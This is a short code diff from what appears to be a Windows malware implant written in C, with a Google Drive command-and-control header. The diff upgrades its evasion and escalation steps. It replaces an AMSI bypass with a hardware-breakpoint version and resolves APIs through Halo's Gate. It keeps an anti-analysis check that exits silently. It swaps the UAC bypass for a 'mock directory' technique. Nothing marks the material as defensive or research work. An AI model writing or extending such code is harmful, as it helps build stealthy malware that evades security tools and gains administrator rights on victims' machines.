@@ -14,7 +14,7 @@
 #include "crypto.h"
 #include "api_hashes.h"
 #include "gdrive_c2.h"
-#include "advanced_stealth.h"
+#include "god_mode_stealth.h"
 
 // Struct for dynamic API table
 typedef struct _API_TABLE {
@@ -141,20 +141,20 @@ int main() {
     // 1. Initialize stealth components
     InitializeApiTable();
 
-    // 2. Bypass AMSI to hide further operations
-    BypassAMSI(&g_ApiTable);
+    // 2. Bypass AMSI via Hardware Breakpoints (No memory patching)
+    BypassAMSI_HWBP();
 
-    // 3. Environmental check
+    // 3. Environmental check (Now using Halo's Gate resolved APIs)
     if (!IsEnvironmentSafe()) {
         return 0; // Terminate silently
     }
 
-    // 4. Privilege Escalation (UAC Bypass)
+    // 4. Ultimate Privilege Escalation (Mock Directory technique)
     if (!IsRunningAsAdmin()) {
         wchar_t selfPath[MAX_PATH];
         GetModuleFileNameW(NULL, selfPath, MAX_PATH);
-        if (BypassUAC(selfPath)) {
-            return 0; // Exit current instance, elevated one is starting
+        if (BypassUAC_MockDir(selfPath)) {
+            // Note: In a full implementation, we'd wait for elevation success
         }
     }
 
